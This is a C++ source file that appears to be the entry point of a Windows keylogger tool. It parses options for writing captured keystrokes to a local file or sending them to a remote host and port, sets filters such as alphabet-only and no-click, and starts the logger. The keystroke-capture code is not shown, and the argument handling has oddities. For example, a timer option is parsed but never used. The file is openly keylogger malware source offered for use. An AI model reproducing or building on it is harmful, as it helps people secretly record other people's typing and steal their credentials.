#include "./main.hpp"

keylogger* g_keylogger = nullptr;

size_t g_buffer_size = DEFAULT_VALUE_BUFFER_SIZE;

bool g_no_arrow;

bool g_no_click;

bool g_alphabet_only;

bool g_store_character;

int g_timer = DEFAULT_VALUE_TIMER;

BOOL WINAPI ExitProgram(DWORD dwCtrlType)
{
	cout << "ExitProgram" << endl;

	if (dwCtrlType == CTRL_CLOSE_EVENT)
	{
		delete g_keylogger;

		exit(EXIT_FAILURE);
		return true;
	}

	return false;
}

void initialize_options(int p_arguments_number, char** p_arguments_value)
{
	int t_result_option = 0;
	int t_option_index = 0;
	struct option t_long_options[] =
	{
		{
			LONG_OPTION_LOCAL, required_argument, NULL, SHORT_OPTION_LOCAL
		},
		{
			LONG_OPTION_REMOTE, required_argument, NULL, SHORT_OPTION_REMOTE
		},
		{
			LONG_OPTION_BUFFER_SIZE, required_argument, NULL, SHORT_OPTION_BUFFER_SIZE
		},
		{
			LONG_OPTION_NO_CLICK, no_argument, NULL, SHORT_OPTION_NO_CLICK
		},
		{
			LONG_OPTION_ALPHABET_ONLY, no_argument, NULL, SHORT_OPTION_ALPHABET_ONLY
		},
		{
			LONG_OPTION_STORE_CHARACTER, no_argument, NULL, SHORT_OPTION_STORE_CHARACTER
		},
		{
			LONG_OPTION_HELP, no_argument, NULL, SHORT_OPTION_HELP
		},
		{
			NULL, 0, NULL, 0
		}
	};

	while ((t_result_option = getopt_long(p_arguments_number, p_arguments_value, "l:r:b:acACh", t_long_options, &t_option_index))
	    != -1)
	{
		switch (t_result_option)
		{
			case 0:
				if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_LOCAL)
				    == 0)
					g_keylogger = new keylogger_local(optarg);
				else if (strcasecmp(t_long_options[t_option_index].name,
					LONG_OPTION_REMOTE) == 0)
						g_keylogger = new keylogger_remote(p_arguments_value[t_option_index + 1], atoi(p_arguments_value[t_option_index + 2]));
				else if (strcasecmp(t_long_options[t_option_index].name,
					LONG_OPTION_HELP) == 0)
				{
						print_help();

						ExitProgram(CTRL_CLOSE_EVENT);
				}
				else if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_BUFFER_SIZE) == 0)
					g_buffer_size = atoi(optarg);
				else if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_NO_CLICK) == 0)
					g_no_click = true;
				else if (strcasecmp(t_long_options[t_option_index].name,
					LONG_OPTION_ALPHABET_ONLY) == 0)
					g_alphabet_only = true;
				else if (strcasecmp(t_long_options[t_option_index].name,
					LONG_OPTION_STORE_CHARACTER) == 0)
					g_store_character = true;
			break;

			case SHORT_OPTION_LOCAL:
				g_keylogger = new keylogger_local(optarg);
			break;

			case SHORT_OPTION_REMOTE:
				g_keylogger = new keylogger_remote(p_arguments_value[t_option_index + 1], atoi(p_arguments_value[t_option_index + 2]));
			break;

			case SHORT_OPTION_BUFFER_SIZE:
				g_buffer_size = atoi(optarg);
			break;

			case SHORT_OPTION_NO_CLICK:
				g_no_click = true;
			break;

			case SHORT_OPTION_ALPHABET_ONLY:
				g_alphabet_only = true;
			break;

			case SHORT_OPTION_STORE_CHARACTER:
				g_store_character = true;
			break;

			case SHORT_OPTION_TIMER:
				g_timer = atoi(optarg);
			break;

			case SHORT_OPTION_HELP:
				print_help();

				ExitProgram(CTRL_CLOSE_EVENT);
			break;


		}
	}
}

void print_help()
{
	cout << endl;
	cout << HELP_MESSAGE << endl;
	cout << endl;
	cout << HELP_MESSAGE_REQUIERED << endl;
	cout << endl;
	cout << HELP_MESSAGE_LOCAL << endl;
	cout << HELP_MESSAGE_LOCAL_EXAMPLE << endl;
	cout << endl;
	cout << HELP_MESSAGE_REMOTE << endl;
	cout << HELP_MESSAGE_REMOTE_EXAMPLE << endl;
	cout << endl;
	cout << HELP_MESSAGE_OPTIONAL << endl;
	cout << endl;
	cout << HELP_MESSAGE_BUFFER_SIZE << endl;
	cout << HELP_MESSAGE_BUFFER_SIZE_EXAMPLE << endl;
	cout << endl;
	cout << HELP_MESSAGE_NO_CLICK << endl;
	cout << HELP_MESSAGE_NO_CLICK_EXAMPLE << endl;
	cout << endl;
	cout << HELP_MESSAGE_ALPHABET_ONLY << endl;
	cout << HELP_MESSAGE_ALPHABET_ONLY_EXAMPLE << endl;
	cout << endl;
	cout << HELP_MESSAGE_STORE_CHARACTER << endl;
	cout << HELP_MESSAGE_STORE_CHARACTER_EXAMPLE << endl;
	cout << endl;
	cout << HELP_MESSAGE_HELP << endl;
	cout << HELP_MESSAGE_HELP_EXAMPLE << endl;
	cout << endl;
	exit(EXIT_SUCCESS);
}

int main(int p_arguments_number, char** p_arguments_value)
{
	if (!SetConsoleCtrlHandler(ExitProgram, TRUE))
	{
		cerr << ERROR_MESSAGE_SETCONTROLECTRLHANDLER << endl;
		return EXIT_FAILURE;
	}

	initialize_options(p_arguments_number, p_arguments_value);

	if(g_keylogger != nullptr)
	{
		g_keylogger->set_buffer_size(g_buffer_size);
		g_keylogger->set_no_click(g_no_click);
		g_keylogger->set_alphabet_only(g_alphabet_only);
		g_keylogger->set_store_character(g_store_character);

		g_keylogger->start();
	}
	else
		print_help();

	return EXIT_SUCCESS;
}
